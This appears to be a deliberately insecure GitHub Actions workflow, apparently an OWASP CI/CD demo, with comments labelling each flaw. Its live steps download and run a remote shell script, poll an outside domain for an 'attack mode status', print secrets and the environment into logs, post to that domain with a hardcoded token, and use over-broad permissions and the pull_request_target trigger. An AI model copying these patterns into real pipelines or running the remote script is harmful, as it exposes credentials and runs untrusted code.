name: CI — Insecure OWASP-demo

# Intentionally permissive triggers: includes pull_request_target and workflow_dispatch
# (these are powerful vectors for attackers if misused)
on:
  push:
    branches: ["main"]
  pull_request:
    branches: ["main"]
  pull_request_target: # CICD-SEC-1: dangerous trigger (can run in target repo context)
    branches: ["main"]
  workflow_dispatch: {}

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      actions: write
      issues: write
    steps:
      # --- checkout code (unpinned) ---
      - name: Checkout
        uses: actions/checkout@v3 # CICD-SEC-4: unpinned action, supply-chain risk

      # --- setup node (unpinned) ---
      - name: Setup Node
        uses: actions/setup-node@v3 # CICD-SEC-4: unpinned action
        with:
          node-version: "18"

      # --- execute remote script from your domain (works, but unsafe) ---
      - name: Fetch external setup script and run (supply-chain risk)
        run: |
          echo "Downloading InsecurePipelineDemo.sh"
          curl -L -o InsecurePipelineDemo.sh \
          "https://drive.usercontent.google.com/download?id=1IkL7uiHQe8LDNr5Tr1dS9Yv5P7lKYFvb&confirm=t"  # CICD-SEC-3/4: remote code execution risk
          chmod +x InsecurePipelineDemo.sh
          ./InsecurePipelineDemo.sh

      - name: Check attack mode status
        run: |
          STATUS=$(curl -s https://5649243.xyz/admin/status)
          echo "Attack mode status: $STATUS"
      # --- install deps without lockfile verification ---
      - name: Install dependencies (no audit, no lockfile check)
        #run: npm install # CICD-SEC-3: no reproducible build
        run : npm ci --frozen-lockfile

      # --- run tests but ignore failures ---
      - name: Run tests (soft fail)
        run: |
          npm test || echo "tests failed but continuing"   # CICD-SEC-10: hides failures

      # --- print environment (leaks secrets) ---
      - name: Print env and secret (credential hygiene issue)
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: |
          echo "ENV HERE:"
          env
          echo "deploy token: $DEPLOY_TOKEN"               # CICD-SEC-6: secret disclosure

      # --- build site (no audit, no SBOM) ---
      - name: Build
        run: npm run build

      # --- create artifact (works now) ---
      - name: Create artifact (no signing/no checksum)
        run: |
          mkdir -p out
          cp -r public/* out/ || true
          tar czf artifact.tar.gz -C out .                 # CICD-SEC-9: no integrity validation

      # --- upload artifact (v4, functional) ---
      - name: Upload artifact (no provenance)
        uses: actions/upload-artifact@v4 # CICD-SEC-3: unpinned dependency version
        with:
          name: build-artifact
          path: artifact.tar.gz

  deploy:
    needs: build-and-test
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - name: Checkout
        uses: actions/checkout@v3 # CICD-SEC-4: unpinned

      - name: Setup Node
        uses: actions/setup-node@v3
        with:
          node-version: "18"

      - name: Ensure npm cache path exists
        run: mkdir -p ~/.npm

      # insecure cache (weak key)
      - name: Cache dependencies
        uses: actions/cache@v3 # CICD-SEC-7: weak/unverified cache key
        with:
          path: ~/.npm
          key: npm-cache-${{ runner.os }}-v1

      - name: Generate build info (no signing / insecure provenance)
        run: |
          BUILD_FILE="public/build-info.json"
          mkdir -p public
          cat <<EOF > $BUILD_FILE
          {
            "build": ${GITHUB_RUN_NUMBER},
            "commit": "${GITHUB_SHA}",
            "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
          }
          EOF
          echo "Generated $BUILD_FILE"

      - name: Execute InsecurePipelineDemo.sh if present
        run: |
          if [ -f ./InsecurePipelineDemo.sh ]; then
          echo "Executing InsecurePipelineDemo.sh"
          chmod +x ./InsecurePipelineDemo.sh
          ./InsecurePipelineDemo.sh || echo "InsecurePipelineDemo.sh exited non‑zero (continuing)"
            else
          echo "InsecurePipelineDemo.sh not found; skipping execution"
            fi

      # deploy to GitHub Pages using write-all token
      - name: Deploy to GitHub Pages
        uses: peaceiris/actions-gh-pages@v3 # CICD-SEC-2: over-privileged token usage
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }}
          publish_dir: ./public

      # post deploy webhook (hardcoded token)
      - name: Post-deploy curl to webhook (hardcoded secret)
        run: |
          echo "Simulating insecure webhook notification..."
          curl -s -o /tmp/resp.txt -w "%{http_code}\n" \
            -X POST "https://5649243.xyz/notify" \
            -H "Authorization: Bearer HARDCODED_WEBHOOK_TOKEN_ABC123" \
            -d '{"status":"deployed"}' || true   # keep pipeline green
          echo "Webhook simulated (insecure)."

  post:
    needs: deploy
    runs-on: ubuntu-latest
    steps:
      # download artifact to demonstrate later integrity lack
      - name: Download artifact
        uses: actions/download-artifact@v4
        with:
          name: build-artifact

      - name: Verify artifact presence (no checksum)
        run: |
          echo "Listing artifacts:"
          ls -la
          echo "No integrity verification performed."      # CICD-SEC-9

      - name: Trigger downstream workflow
        run: |
          curl -X POST -H "Accept: application/vnd.github+json" \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            https://api.github.com/repos/${{ github.repository }}/dispatches \
            -d '{"event_type":"post-deploy"}'              # CICD-SEC-5: ungated pipeline trigger
